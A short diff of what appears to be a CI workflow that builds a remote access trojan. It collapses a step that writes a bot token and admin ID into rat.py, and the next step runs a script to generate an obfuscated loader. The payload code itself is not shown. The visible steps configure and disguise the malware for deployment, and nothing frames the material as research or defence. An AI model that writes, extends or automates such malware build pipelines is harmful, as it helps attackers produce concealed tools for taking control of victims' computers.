@@ -35,15 +35,7 @@ jobs:
       
       - name: Replace token and admin_id in rat.py
         run: |
-          python -c "
-          import re
-          with open('rat.py', 'r', encoding='utf-8') as f:
-              content = f.read()
-          content = content.replace('{{TOKEN}}', '${{ inputs.token }}')
-          content = content.replace('{{ADMIN_ID}}', '${{ inputs.admin_id }}')
-          with open('rat.py', 'w', encoding='utf-8') as f:
-              f.write(content)
-          "
+          python -c "import re; content = open('rat.py', 'r', encoding='utf-8').read(); content = content.replace('{{TOKEN}}', '${{ inputs.token }}'); content = content.replace('{{ADMIN_ID}}', '${{ inputs.admin_id }}'); open('rat.py', 'w', encoding='utf-8').write(content)"
       
       - name: Generate obfuscated loader
         run: python build_obfuscated.py
